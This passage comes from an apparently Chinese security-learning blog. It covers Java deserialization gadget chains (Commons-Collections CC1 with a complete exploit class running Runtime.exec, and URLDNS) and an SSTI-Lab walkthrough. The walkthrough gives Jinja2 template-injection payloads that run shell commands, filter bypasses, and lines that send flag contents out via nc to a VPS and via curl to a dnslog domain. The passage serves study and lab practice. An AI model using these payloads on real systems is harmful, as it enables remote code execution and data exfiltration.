</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> declaredConstructor.newInstance(Override.class, decorateMap);  </span><br><span class="line">        <span class="comment">//序列化与反序列化  </span></span><br><span class="line">        serialize(o);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="解决传入对象不为Runtime对象"><a href="#解决传入对象不为Runtime对象" class="headerlink" title="解决传入对象不为Runtime对象"></a>解决传入对象不为Runtime对象</h3><p>这里找到ConstantTransfomer，看它里面的两个方法<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262149259.png" alt="image-20230426214930163"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;  </span><br><span class="line">    <span class="built_in">super</span>();  </span><br><span class="line">    iConstant = constantToReturn;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> iConstant;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>transform方法返回构造函数中传入的参数，那么控制其返回Runtime.class就解决了这个问题<br>所以现在payload为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">&#125;;  </span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">map.put(<span class="string">&quot;kkk&quot;</span>,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line"><span class="type">Constructor</span> <span class="variable">annotationInvocationHdConstructor</span> <span class="operator">=</span>  c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class,Map.class&#125;);  <span class="comment">//获取类的构造方法  </span></span><br><span class="line">annotationInvocationHdConstructor.setAccessible(<span class="literal">true</span>); <span class="comment">//保证可以访问  </span></span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHdConstructor.newInstance(Override.class, transformedMap);  </span><br><span class="line">serialize(o);  </span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="解决两个if问题"><a href="#解决两个if问题" class="headerlink" title="解决两个if问题"></a>解决两个if问题</h3><p>通过调试发现，这里不会进入if会直接跳过setValue<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262149733.png" alt="image-20230426214954634"><br>我们往上分析一下memberType的来源看看它的作用<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262150959.png" alt="image-20230426215001865"><br>可以看到它是获取传参中注解的成员方法，所以memberType不能为空即注解的成员方法不能为空，然后去找传入的注解<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262150779.png" alt="image-20230426215011729"><br>可以看到注解为Override，点进去看看<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262150156.png" alt="image-20230426215022091"><br>为空，所以这个注解不行，用<code>Target.class</code> 尝试一下，点进 <code>Target</code>，当中有一个成员变量为 <code>value</code>，所以我们 <code>hashmap.put</code> 也需要修改为 <code>value</code>，因为第二个if就是判断成员变量与hashMap传入的参数是否相等，修改完之后到结束了</p><h3 id="最终EXP"><a href="#最终EXP" class="headerlink" title="最终EXP"></a>最终EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="comment">//用于解决第一个问题，Runtime不能被序列化  </span></span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="comment">//这里创建一个hashmap对象是因为decorateTransform方法第一个参数为map对象  </span></span><br><span class="line">  </span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class, Map.class&#125;);  </span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> declaredConstructor.newInstance(Target.class, decorateMap);  </span><br><span class="line">        <span class="comment">//序列化与反序列化  </span></span><br><span class="line">        serialize(o);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>弹出成功<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262151916.png" alt="image-20230426215110821"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>看一下整个的利用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">InvokerTransfomer#transform</span><br><span class="line">   TransformedMap#checkSetValue</span><br><span class="line">      AbstractInputCheckedMapDecorator#setValue</span><br><span class="line">         AnnotationInvocation#readObject</span><br><span class="line"></span><br><span class="line">辅助利用链</span><br><span class="line">ConstantTransformer</span><br><span class="line">ChainedTransformer</span><br><span class="line">HashMap</span><br></pre></td></tr></table></figure><p>流程图<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262151401.png" alt="image-20230426215124329"><br>感觉跟完还是有点懵，不知道如何利用，还是得实际运用一下</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java学习之URLDNS链</title>
      <link href="/undefined/15463.html"/>
      <url>/undefined/15463.html</url>
      
        <content type="html"><![CDATA[<p>先放代码，感觉还是自己跟着视频手写一遍更好理解，很多理解放在注释中了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap; <span class="comment">//入口类  </span></span><br><span class="line"><span class="keyword">import</span> java.net.URL;  <span class="comment">//调用链中的类  </span></span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">  </span><br><span class="line">        HashMap &lt;URL,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://vnmkzfpuho.dnstunnel.run&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//通过反射获取到url中的hashcode属性  </span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> url.getClass().getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);  </span><br><span class="line">        <span class="comment">//hashcode为私有属性，通过下面方法设置为可操作  </span></span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//这里在put前需要将hashCode值改一下，不然put方法也会请求dns，这样不管有没有反序列化都会请求dns  </span></span><br><span class="line">  </span><br><span class="line">        field.set(url,<span class="number">2</span>);  <span class="comment">//重新设，避免混淆  </span></span><br><span class="line">  </span><br><span class="line">        hashMap.put(url,<span class="number">2</span>);  </span><br><span class="line">  </span><br><span class="line">        field.set(url,-<span class="number">1</span>);  <span class="comment">//改回，不然这条链就不能利用  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//进行序列化  </span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">w</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;bin.ser&quot;</span>));  </span><br><span class="line">        w.writeObject(hashMap);  </span><br><span class="line">        System.out.println(w);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//进行反序列化  </span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;bin.ser&quot;</span>));  </span><br><span class="line">        o.readObject();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>看一下大佬总结的原理<br><em><strong>java.util.HashMap 重写了 readObject, 在反序列化时会调用 hash 函数计算 key 的 hashCode.而 java.net.URL 的 hashCode 在计算时会调用 getHostAddress 来解析域名, 从而发出 DNS 请求.</strong></em></p><h2 id="开始分析"><a href="#开始分析" class="headerlink" title="开始分析"></a>开始分析</h2><p>进入到hashMap类中可以看到它有序列化的接口<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232239690.png" alt="image-20230422211906952"><br>并且重写了readObject，这个方法用于序列化数据，在Java中，如果readObject被重写那么首先会调用重写的readObject，下面这里的s为输入流证明可控<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232242194.png" alt="image-20230423224233141"><br>开始调试，首先直接在下面这里进入hashMap类<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232242993.png" alt="image-20230423224245956"><br>然后找到readObject方法在putVal()方法位置下断点<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232242372.png" alt="image-20230423224257331"><br>这里hash()方法对key值重新进行了计算而key值为URL类的对象，跟进看一下<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232243955.png" alt="image-20230423224317914"><br>hash()方法里面调用了hashCode()方法，这里key是URL的对象所以这里的hashCode方法是URL类中的，这里调试的时候一定要到key为URL对象后才能进入URL类中hashCode()方法，不然进入的就是Object中的hashCode()方法，对于小白这里很容易迷糊，比如我，继续跟进<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232243515.png" alt="image-20230423224330461"><br>来到了URL的hashCode()方法，可以看到这里值不为-1的话就直接返回了，所以值必须为-1，在这个类中它的值已经初始化好了<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232243334.png"><br>继续分析，下面这里对hashCode进行了处理，跟进handler对象的hashCode()方法<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232243350.png"><br>可以看到handler是URLStreamHandler的对象<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232244392.png" alt="image-20230423224413351"><br>可以看到在对hashCode进行处理时调用了getHostAddress()方法，这个方法可以获取IP地址<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232244708.png" alt="image-20230423224436669"><br>跟进这个方法，这里直接贴一位大佬带有注释的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (u.hostAddress != <span class="literal">null</span>)<span class="comment">//先判断该URL的hostAddress属性是否已经有值了</span></span><br><span class="line">        <span class="keyword">return</span> u.hostAddress;<span class="comment">//如果已有值，直接返回</span></span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();<span class="comment">//获取Host</span></span><br><span class="line">    <span class="keyword">if</span> (host == <span class="literal">null</span> || host.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            u.hostAddress = InetAddress.getByName(host);<span class="comment">//获取IP地址，并把值赋给URL的hostAddress</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownHostException ex) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SecurityException se) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> u.hostAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从这里可以看出，如果你之前已经访问过dns的域名那么就不会出发第二次，我就是因为这个卡了半天还以为代码有问题，最后在下面这里发起DNS请求<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232244816.png" alt="image-20230423224452776"><br>后面具体怎么发起请求可参考<a href="https://leihehe.top/2021/11/16/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BURLDNS%E5%88%A9%E7%94%A8%E9%93%BE-7/">Java反序列化漏洞之URLDNS利用链(7) | LeiH - Blog (leihehe.top)</a><br>执行程序可看到请求成功<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232245550.png" alt="image-20230423224502505"></p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><blockquote><p>HashMap.readObject()-&gt;HashMap.putVal()-&gt;HashMap.hash()-&gt;URL.hashCode()</p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>虽然这是Java反序列化最简单的一条链但是我一点都没感觉轻松，所以这篇分析还有很多不足之处，感觉自己手写分析之后再去看ysoserial上的URLDNS链会轻松很多，一开始直接拿那个链分析一直没进度</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SSTI-Lab</title>
      <link href="/undefined/62614.html"/>
      <url>/undefined/62614.html</url>
      
        <content type="html"><![CDATA[<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>前面的试探就不弄了，当然也可以试一下看自己环境有没有问题<br>先给出payload：<code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()[143].__init__.__globals__['popen']("type flag").read()&#125;&#125;</code><br>这里找的是<code>os._wrap_close</code>通过脚本搜索下标为143，初始化之后可以使用popen来打开flag，这里有一个点卡了我很久，就是<code>&quot;type flag&quot;</code>我一直使用<code>&quot;cat flag&quot;</code>得不到flag，而我一开始是不知道type这个命令的，看到<a href="https://www.o2takuxx.com/index.php/2022/09/20/ssti-labs%e9%9d%b6%e5%9c%ba/">SSTI-Labs靶场 - o2takuXX の blogo2takuXX の blog</a>这篇博客才知道type命令<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303272011836.png" alt="image-20230327201121406"><br>通过GPT的回答应该是由于我在Windows下部署的环境导致的问题，最终使用type得到flag<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303272011503.png" alt="image-20230327201153225"><br>当然可以用的模块很多，可以参考一下网上其它博主的wp，这里就不一一列举了</p><h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>这一关过滤了<code>&#123;&#123;`可以用`&#123;% %&#125;`来绕过，`&#123;% %&#125;`用于执行python代码所以直接print一下就行payload：`&#123;%print("".__class__.__bases__[0].__subclasses__()[143].__init__.__globals__['popen']("type flag").raead())%&#125;`![image-20230327201213126](https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303272012396.png)这里也放一下import方法实现便于我自己以后查看，在`_frozen_importlib._ModuleLock`模块中有import方法，搜索下标为100payload：`&#123;%print(''.__class__.__bases__[0].__subclasses__()[100].__init__.__globals__['__import__']('os').popen("type flag").read())%&#125;`这种方法是通过import方法导入os模块执行popen函数来实现的## level 3这一关是没有回显，可以通过外带到vps来得到flag，也可以利用dnslog先看外带到vps`&#123;&#123;''.__class__.__bases__[0].__subclasses__()[100].__init__.__globals__['__builtins__'].eval("__import__('os').popen('type flag|nc vps port').read()")&#125;&#125;</code><br>同样是利用<code>_frozen_importlib._ModuleLock</code>模块中的方法但是这里就多了一个<code>__builtins__</code>这个模块返回一个由内建函数（即python自带函数）函数名组成的列表<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303272012454.png" alt="image-20230327201230329"><br>理解这个方法执行就可以看懂payload了，前面的原理没变，<code>__builtins__</code>是object的一个子类，所以前面导入了object就可以搜寻到<code>__builtins__</code>就相当于导入了，eval是内置函数所以<code>__builtins__</code>可以直接调用，然后导入os模块，<code>type flag</code>先找到flag目录通过nc命令输出到自己的vps上，Windows下需要自己安装一下nc命令，这时候真感觉将环境部署到Linux下方便很多<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303272012421.png" alt="image-20230327201251069"><br>然后看一下外带到dnslog上的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[100].__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;curl http://`type flag`.ou7jiq.dnslog.cn&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>然后报错了，没解决先放着<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303272013947.png" alt="image-20230327201306652"></p><h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>这一关过滤了<code>[]</code>使用遍历来绕过，配合<code>__getitem__</code>魔术方法进行取值<br>payload：<code>&#123;% for i in ''.__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__=='Popen' %&#125;&#123;&#123; i.__init__.__globals__.__getitem__('os').popen('type flag').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code><br>这个payload的前半部分相当于</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__():</span><br><span class="line">    <span class="keyword">if</span> i.__name__==<span class="string">&#x27;Popen&#x27;</span></span><br><span class="line">    需要执行的内容</span><br></pre></td></tr></table></figure><p>执行payload得到flag<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202303272013616.png" alt="image-20230327201322430"></p><h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>这一关过滤了单双引号，使用request进行绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">request              #request.__init__.__globals__[&#x27;__builtins__&#x27;]</span><br><span class="line">request.args.x1    #get传参</span><br><span class="line">request.values.x1  #所有参数</span><br><span class="line">request.cookies      #cookies参数</span><br><span class="line">request.headers      #请求头参数</span><br><span class="line">request.form.x1    